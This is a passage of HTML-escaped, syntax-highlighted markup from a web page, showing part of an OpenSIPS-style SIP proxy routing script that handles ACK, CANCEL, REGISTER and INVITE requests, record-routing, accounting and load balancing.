&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has_totag&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# handle hop-by-hop ACK (no routing required)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# sequential request within a dialog should&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# take the path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !loose_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# we do record-routing for all our traffic, so we should not&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# receive any sequential requests without Route hdr.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not here&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# do accounting even if the transaction fails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if caller is not local, then called number must be local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Rely forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account only INVITEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		create_dialog&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_ts&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Ts;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;start_tsm&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $Tsm;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$dlg_val&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;pdd_pen&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invite_reply&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;501&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Implemented&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!load_balance&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no available destinations!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;No available dsts&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# when routing via usrloc, log the missed calls also&lt;/span&gt;
